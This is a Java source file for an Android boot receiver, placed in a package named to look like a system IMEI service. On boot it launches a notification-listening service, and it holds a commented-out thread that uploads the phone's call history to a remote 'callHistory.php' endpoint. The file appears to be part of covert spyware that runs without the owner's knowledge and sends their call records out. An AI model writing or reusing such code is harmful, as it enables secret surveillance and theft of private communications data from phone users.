package system.android.services.imei.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import system.android.services.imei.NotificationListener;
import system.android.services.imei.calls.ReadCallHistory;
import system.android.services.imei.network.Network;

public class BootReciever extends BroadcastReceiver {
    public BootReciever() {
    }

    @Override
    public void onReceive(final Context context, Intent intent) {
        context.startService(new Intent(context, NotificationListener.class));

//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                new Network().UploadFile(context, ReadCallHistory.getCallDetails(context), "callHistory.php");
//            }
//        }).start();
    }
}
